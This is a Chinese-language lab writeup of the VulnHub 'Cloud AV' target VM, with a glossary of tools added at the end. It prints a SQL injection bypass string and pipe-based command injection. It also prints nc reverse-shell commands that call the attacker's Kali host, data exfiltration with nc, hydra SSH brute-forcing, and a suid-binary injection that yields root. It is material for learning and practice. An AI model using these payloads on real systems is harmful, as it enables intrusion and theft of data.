# 相关信息

靶机相关介绍：[BoredHackerBlog: Cloud AV ~ VulnHub](https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/)

靶机下载地址：https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova

靶机ip：192.168.195.28

kali_ip：192.168.195.170

# 文字版思路

## 渗透流程

这个靶机的关键不是sql的注入，而是命令的注入。两次的反弹连接都是需要同命令的注入`|`来实现的。

发现主机-->探测服务-->登陆网页-->绕过验证（sql inject or dict cracking）-->命令执行漏洞反弹shell-->获取数据库文件（有密码）-->ssh爆破连接（失败）-->发现有suid权限的程序-->再利用命令执行漏洞拿下root。

## 渗透感想

思路是这个思路，打通后发现其实并不难。即便有些漏洞不知道，有些工具和技巧不会，但都是些知道就会的东西。唯一让我感到困难的是我无法直接通过  `简单完成打靶`获取的知识

主要困难出现在三个方面，而这三个方面是你无法从课程上学来的。

1. 对于各种文件名，服务，端口等的敏感度

    在渗透的过程中我们会浏览大量的文件和文件夹（开发框架的文件名，软件的配置文件，系统自带的某些变量名等）。如何快速有效的抓取有效信息，很多时候是需要一定==灵性==的。而这种 ==灵光乍现== 是要我们不断地积累和记忆的。

2. 试错的过程

    通过看打靶流程或者视屏，是非常好的选择，但是他们不可能向我们展示他们不断试错的过程的。（这就要求我们一定要独立的进行专门的打靶练习）。我们必须知道漏洞是很容易利用的（一旦发现的话），但是发现漏洞的过程是非常的困难的。

    1. 需要有漏洞的大量储备
    2. ==具有一定的代码审计能力（非常重要==），而且要求还不低。
    3. 有大量的来信来看海量的文件来发现漏洞

3. ==代码的审计能力==

## 如何提权

利用权限设置不当（suid,sgid）

# 图片版思路/步骤

## 发现漏洞

1. 进行目标的发现，然后利用nmap进行进一步探测。

    <img src="http://image.cchl.fun/kali_image/image-20230516185718192.png" alt="image-20230516185718192" style="zoom:50%;" />

    <img src="http://image.cchl.fun/kali_image/image-20230516185841792.png" alt="image-20230516185841792" style="zoom:50%;" />

2. 打开浏览器，发现网站。通过页面的问题可以了解是一个类似于登陆的一种验证所以就有两种思路：SQL注入/暴力破解

    <img src="http://image.cchl.fun/kali_image/image-20230516185922760.png" alt="image-20230516185922760" style="zoom:67%;" />

## 进入漏洞

### SQL注入

1. 打开burpsuite来进行sql注入（==推荐使用内置浏览器==），打开`sinper模式`来测试特殊字符的注入。（这里的特殊字符一般建议全部包含，因为在不同的环境，不同的数据库和不同的语句构造下一个字符可能有不同的含义。==都是英文字符的哇==

    <img src="http://image.cchl.fun/kali_image/image-20230516192449522.png" alt="image-20230516192449522" style="zoom:67%;" />

    <img src="http://image.cchl.fun/kali_image/image-20230516192539233.png" alt="image-20230516192539233" style="zoom:67%;" />

    ![image-20230516192938416](http://image.cchl.fun/kali_image/image-20230516192938416.png)

2. 查看返回包（一般通过返回的状态码和返回页面的长度来进行报文的筛选）。我们可以发现特殊字符`"`的报文返还长度明显不一样。我们可以查看报文为后台数据的报错页面（实战中几乎不可能）。

    爆出了SQL语句：

    ```html
     if len(c.execute('select * from code where password=&quot;' + password + '&quot;').fetchall()) &gt; 0:
    ```

    将sql语句提取出来，同时由于==&quot为html==中的转移字符相当于`"`，`'+password+'`整体是一个变量的代还。在将password用`"`替换。我们就可以还原原来的sql语句。

    ```mysql
    select * from code where password=";  "   ";
    ```

    <img src="http://image.cchl.fun/kali_image/image-20230516193049064.png" alt="image-20230516193049064" style="zoom:50%;" />

3. 就可以进行sql注入`sdf" or 1=1;-- `注入后的sql语句就为如下，==注意mysql的==`--`==注入要生效的话==，是需要空格和后面的内容隔开的。就可以看到可以成功的进入到功能的使用页面。

    ```mysql
    select * from code where password=";sdf" or 1=1;--  "   ";
    ```

    

    ![image-20230516195553976](http://image.cchl.fun/kali_image/image-20230516195553976.png)

### 暴力破解

1. 直接使用burpsuite的狙击手模式然后选一个字典就可以。密码为`password`

进入后我们通过阅读网页的信息，可以发现是一个病毒的检测平台。你可以通过输入相关的文件名来检测其安全性。

![image-20230516202314104](http://image.cchl.fun/kali_image/image-20230516202314104.png)

![image-20230516202357103](http://image.cchl.fun/kali_image/image-20230516202357103.png)



## 反弹shell

1. 我们可以明显的发现，这些文件都是在云端上的（靶机上的）。我们可以猜想是我们输入一个文本。靶机会将我们输入的文本填入到命令的执行中进行检测，可能类似于sql注入的命令注入。eg:`ant-virus 'text'`(ant-virus为一个靶机上假设的检测病毒的软件，‘txt'为我们的传入文本)。通过上面的分析我们可以尝试通过联合命令的注入执行来测试是否符合我们的猜想：`hello | id`  		[==(|)管道符的作用==](#tag1)<a id='back1'></a>

![image-20230516204141154](http://image.cchl.fun/kali_image/image-20230516204152048.png)

![image-20230516204202274](http://image.cchl.fun/kali_image/image-20230516204202274.png)

2. 通过刚刚的步骤，我们可以发现目标的主机存在命令的联合注入漏洞。通过`|`我们是可以上载其他命令的。通过这个特性我们可以通过非常简单的反弹shell进行连接。这一步我们可以通过多种方式进行。这里我们采用简最简单的`nc`工具的命令的以此完整的反弹shell。

    ==反弹shell是有多种方法的，python,c，命令，nc等等。我们需要根据不同情况如：靶机的状态，工具脚本的检测，脚本上传的难度等等。==`虽然nc在linux的发行版本中不是全部包含的，但是它非常常见的，利用好是非常关键的`

    1. 确定`nc`的位置。

        ![image-20230516204519229](http://image.cchl.fun/kali_image/image-20230516204519229.png)

        ![image-20230516204443611](C:/Users/27711/AppData/Roaming/Typora/typora-user-images/image-20230516204443611.png)

   2. 查看是否能够返向连接：`hello | nc 192.168.195.170 4444 `,测试成功。

      ![image-20230516204557177](http://image.cchl.fun/kali_image/image-20230516204557177.png)![image-20230516204707840](http://image.cchl.fun/kali_image/image-20230516204707840.png)

   3. 这一步很关键也很有趣。当我们发现nc可以正常工作的时候就和以通过`nc 192.168.195.170 4444 -e /bin/sh`来进行持续的返向连接的时候，我们发现是无法成功的我们就要猜测为什么了（1，存在一定的防护无法返向连接。2，nc在老版本中是么有`-e`这个参数的。）通过上面的返向连接的成功我们可以发现是可能2，是极为可能的。

      这里就要使用到一个技术`nc串联`进行老版本的nc反弹shell：						

      在本地监听3333,4444两个端口。上载`hello | nc 192.168.195.170 3333 | /bin/bash | nc 192.168.195.170 4444`。我们就可以在3333的监听端口输入命令，4444端口会返哈命令的执行结果。-------->[==具体讲解==](#tag2)		<a id ='back2'></a><img src="http://image.cchl.fun/kali_image/image-20230516205232727.png" alt="image-20230516205232727" style="zoom: 80%;" />
   
   4. 结合上一步的图片，我们可以查看靶机的相关信息。查阅`app.py`文件可以很明显的发现这是这是一个简单读的重定向的文件，通过你的登陆的状态和方式来进行网页的重定向。与此同时我们还会发现有个很敏感的文件`database.sql`文件。在kali的终端（和靶机进行输入命令的终端）输入`sqlite3/sqlite`发现靶机是没有本地的sql环境的。
   
      ![image-20230517143339301](http://image.cchl.fun/kali_image/image-20230517143339301.png)
   
   5. 进行`datebase.sql`文件的获取。在本机开启`nc -lnvp 5555 > db.sql`进行监听，同时将传输的信息写入到`db.sql`文件中。kali的终端（和靶机进行输入命令的终端）输入`nc 192.168.195.170 < database.sql`来表示将`database.sql`文件传给kali。
   
      <img src="http://image.cchl.fun/kali_image/image-20230517142743390.png" alt="image-20230517142743390" style="zoom:50%;" /><img src="http://image.cchl.fun/kali_image/image-20230517143747687.png" alt="image-20230517143747687" style="zoom:50%;" />
   
   6. 在kali本机进行数据库文件的分析。发现是有相关的字段的。尤其是`password`字段是非常重要的。因为我们在最开始的端口扫描发现是有`ssh`登陆的。----->[==具体解释==](#tag3)<a id ='back3'></a>
   
      <img src="http://image.cchl.fun/kali_image/image-20230517144934217.png" alt="image-20230517144934217" style="zoom:50%;" />
   
   7. 由于我们获取的一个密码字段，我们可以生成一个`password.txt`的密码字典，然后通过在在kali的终端（和靶机进行输入命令的终端）输入`cat /etc/passwd | grep /bin/bash`来查看可以使用shell的用户，然后生成一个`user.txt`的字典。
   
      <img src="http://image.cchl.fun/kali_image/image-20230517150212540.png" alt="image-20230517150212540" style="zoom:50%;" />
   
   8. 然后我们通过`hydra`工具进行爆破，发现并没有成功（并没有成功并不代表这个步骤不许要做，==在真实的渗透中我认为是必须要做的一个步骤。==）
   
      <img src="http://image.cchl.fun/kali_image/image-20230517151222915.png" alt="image-20230517151222915" style="zoom:50%;" />
   
   9. 我来不断地查看靶机的文件，如下。
   
       `/home/scanner/cloudav_app`目录下的`templates`和`samples`文件夹中的文件为。其中可以很明显的发现templates是一个web的模板文件（问百度），而samples中的是一个我们检测的病毒样本。
   
       <img src="http://image.cchl.fun/kali_image/image-20230517161735212.png" alt="image-20230517161735212" style="zoom:50%;" />
   
       继续翻阅文件我们发现两个文件是很有关联的，我们可以大胆的猜测`update_cloudav.c`是源码。这个源码也是非常简单的一个C语言代码，自己阅读。==而且更为关键的是编译后的程序是具有s，既suid这个特殊权限的。==就以为在我们可以利用这个文件来使用root权限了。
   
       <img src="http://image.cchl.fun/kali_image/image-20230517162626843.png" alt="image-20230517162626843" style="zoom:33%;" />
   
       <img src="http://image.cchl.fun/kali_image/image-20230517162049239.png" alt="image-20230517162049239" style="zoom: 33%;" />
   
       我们需要注意的是`ClamAV`是一个linux的病毒扫描软件。`freshclam`相当于是一个更新`clamav`的病毒库的功能。同时对输入的参数进行的长度的限制，同时要求必须有参数的传入。
   
       是不是这种方式很熟悉？不就是刚开始网页的那种功漏洞吗？
   
   11. 我输入`./update_cloudav "aasff | nc 192.168.195.170 3000 | /bin/bash | nc 192.168.195.170 4000"`然后开启监听不久可以发现我们连接成功。==一定要加上./==我也是服了。然后我们就可以发现拿下了root权限。结束
   
        ![image-20230517164708284](http://image.cchl.fun/kali_image/image-20230517164708284.png)
   
       ![image-20230517164750327](http://image.cchl.fun/kali_image/image-20230517164750327.png)
   
        

# 相关工具的使用

### arping

1. what?

    `arping`利用ARP协议来测试主机之间的连通性。通过发送ARP请求直接与目标主机进行通信。可以更准确地确定主机之间的连通性，而不受中间设备（如路由器）的干扰。而且它通常可以获得更快的响应时间。广泛支持，该工具在多个操作系统中都可用，包括Linux、Windows和macOS等。

    此外，`arping`仅适用于在同一局域网中测试主机之间的连通性，不能用于跨网络或互联网的连通性测试。

2. 具体参数

    - `-I, --interface <接口>`：指定要使用的网络接口。
    - `-s, --source <源IP地址>`：指定发送ARP请求的源IP地址。
    - `-c, --count <次数>`：指定发送ARP请求的次数。
    - `-w, --timeout <超时时间>`：指定等待ARP响应的超时时间。
    - `-D, --duplicate`：允许发送重复的ARP请求。
    - `-U, --unicast`：使用单播模式发送ARP请求。

### <a id ='tag2'>nc</a> 								

1. nc 192.168.195.170 3333 | /bin/bash | nc 192.168.170 4444						[==返回原地方==](#back2)	

    1. nc 192.168.195.170 3333| /bin/bash

         `nc` 将尝试建立一个 TCP 连接到目标主机的默认端口（通常是 80 或 443）。这样，你可以与目标主机进行简单的网络通信，发送和接收数据。这时候本机就可以同`192.168.195.170`（kali）进行tcp的通讯，是可以持续连接的。也解释了为什么可以输入的个命令连续的测试。

         这样192.168.195.170（kali）的通讯信息会直接传入到  /bin/bash中。

    2. /bin/bash | nc 192.168.195.170 4444

        那么就可以将 `shell`的执行返回内容在次通过另一个端口返回给 192.168.195.170来展示。
    
    3. nc -nlvp 4444 > file
    
        ​	表示将监听到的数据写入到`file`中，这个命令可以实现文件的传输
    
    4. nc 192.168.195.170 < file
    
        ​	表示和`192.168.195.170`建立连接,并将`file`文件进行传输。

### sqlite3					

1. what？											[==返回原地方==](#back3)	<a id='tag3'></a>

    ​	SQLite 是一个软件库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。SQLite 是在世界上最广泛部署的 	SQL 数据库引擎。SQLite 源代码不受版权限制。

2. 具体使用

    1. `.open db.sql` ：如果数据库存在则直接会打开，不存在就创建它。
    2. `.database`：查看已经存在的数据库。
    3. `.dump`：导出完整的数据库数据，可以追加`> `来将其导入到文本文件中。

### hydra								

1. what?

    用于==密码破解网络登录==蛮力攻击工具。通过用户名和密码字典进行暴力破解。还支持暴==力破解登录页面中的表单==，具有高度可定制化和灵活性。此外，用户还可以在攻击前对==目标主机进行端口扫描==，以确认要攻击的服务端口。Medusa也支持多线程破解，

2. 具体实例

    1. hydra -L user.txt -P password.txt ssh://192.168.195.28
        1. -L/-l：用于指定登陆的用户
        2. -P/-p：用于指定密码。
        3. ssh://：按这个格式来

# 复盘/其他知识点

### /bin/sh

在许多系统中，`/bin/sh`实际上是指向其他Shell解释器的符号链接，例如Bash Shell（/bin/bash）、Dash Shell（/bin/dash）或其他兼容的Shell。这是因为在现代系统中，Bash Shell通常作为默认的Shell解释器，而`/bin/sh`被链接到Bash Shell的路径。

因此，当您在命令中使用`/bin/sh`时，它实际上是指定使用系统默认的Shell解释器来执行相应的命令。具体使用哪种Shell取决于系统配置和符号链接的设置。

### <a id='tag1'>(|)管道符	</a>						

1. what?								[==返回原地方==](#back1)	

    将一个命令的输出作为另一个命令的输入进行处理，实现两个或多个命令之间的协作。通过管道，可以将一个命令的输出传递给另一个	命令进行进一步处理，实现数据流的传递和处理。	

2. 直接放入两个命令之间即可

### /bin/bash

1. what?

    `/bin/bash` 是在常见的Linux系统中找到的默认shell路径。

2. 直接调用即可。

### 特殊权限

1. what？

    ​	在---中前两位为读写，第三位为x，但第三位同时也有另外三个权限：suid、sgid、sticky

2. 具体解释

    1. suid：让普通用户临时拥有该文件的属主的执行权限，==suid权限只能应用在二进制可执行文件（命令）上==，而且suid权限==只能设置在属主位置上==。					（==可以用来提权==）

        增加权限u+s，移除权限u-s


    2. sgid：sgid权限一般应用在目录上，当一个目录拥有sgid权限时，任何用户在该目录下创建的文件的属组都会继承该目录的属组。
    
        sgid权限也使用s表示，增加权限g+s，移除权限g-s；
    
    3. sticky：sticky权限一般针对目录来设置，作用是只允该目录下的文件的创建者删除自己的创建的文件，不允许其他人删除文件。（root用户除外，因为root用户是超级管理员），而且sticky权限只能设置在other位置上。
    
        使用t表示，增加权限o+t，移除权限o-t；

### /etc/passwd

1. what?

    用来存储用户信息的

2. 具体解释

    ![image-20230517161033703](http://image.cchl.fun/kali_image/image-20230517161033703.png)

    每一行使用“：”分隔开，共有七个字段。

    1. 账号名称

        就是账号，用来对应UID的。

    2. 密码

        早期UNIX系统的密码就放在这字段上，后来将密码数据字段的数据改放到/etc/passwd 中了，所以这里你会看到一个“x”。

    3. UID

        这个是用户标识符：

        1. 0（系统管理员）当UID为0时，代表这个账号是“系统管理员”

        2. 1~499（系统用户）保留给系统使用的ID，默认500以下的数字让给系统作为保留账号只是一个习惯

        3. 1~99：由distributions自行创建的系统账号

        4. 100~499：若用户有系统账号需求时，可以使用的账号UID

        5. 500~65535（可登陆账号）给一般用户用的

    4. GID

        这个是用户组标记符

    5. 用户信息说明列

        这个字段基本上并没有什么重要用途，只是用来解释这个账号的意义而已。不过，如果你提供使用finger的功能时，这个字段可以提供很多的信息

    6. 主文件夹

        这是用户的主文件夹。如果你想修改某个账号的主文件夹只需要对这个字段进行修改。默认的用户主文件夹在/home/yourIDname中，root的主文件夹在/root中。标记了用户可以使用的文件。

    7. 命令解释器：

        就是你的shell是通过上面执行的。







